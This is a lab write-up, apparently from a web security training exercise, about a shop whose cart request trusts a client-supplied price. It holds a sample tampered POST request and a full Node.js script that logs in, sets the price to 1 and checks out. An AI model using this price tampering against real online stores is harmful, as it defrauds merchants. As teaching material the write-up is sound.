# 1 - Excessive client-side trust

### Notes

The "add to cart" functionality includes the product's price in the POST request to `/cart` and this value is not being properly validated in the back end.

```http
POST /cart HTTP/1.1

productId=1&redir=PRODUCT&quantity=1&price=133700
```

### Scripted Solution

```javascript
const axios = require('axios').default
const { wrapper } = require('axios-cookiejar-support')
const { CookieJar } = require('tough-cookie')
const { JSDOM } = require('jsdom')
require('dotenv').config({ path: './.env' })

/**
 * Run exploit.
 */
async function main() {
  const labUrl = process.env.LAB_URL

  const jar = new CookieJar()
  const client = wrapper(axios.create({ jar }))
  const username = 'wiener'
  const password = 'peter'

  // Get CSRF token from login form
  const loginRes = await client.get(`${labUrl}/login`)
  const loginDom = new JSDOM(loginRes.data)
  const loginCsrfToken =
    loginDom.window.document.querySelector('input[name="csrf"]').value

  // Log in to application
  await client.post(
    `${labUrl}/login`,
    `csrf=${loginCsrfToken}&username=${username}&password=${password}`
  )

  // Add 'Lightweight l33t leather jacket' to cart, changing the price
  const newPrice = 1
  await client.post(
    `${labUrl}/cart`,
    `productId=1&redir=PRODUCT&quantity=1&price=${newPrice}`
  )

  // Get CSRF token from cart page
  const cartRes = await client.get(`${labUrl}/cart`)
  const cartDom = new JSDOM(cartRes.data)
  const cartCsrfToken =
    cartDom.window.document.querySelector('input[name="csrf"]').value

  // Order jacket
  await client.post(`${labUrl}/cart/checkout`, `csrf=${cartCsrfToken}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
```
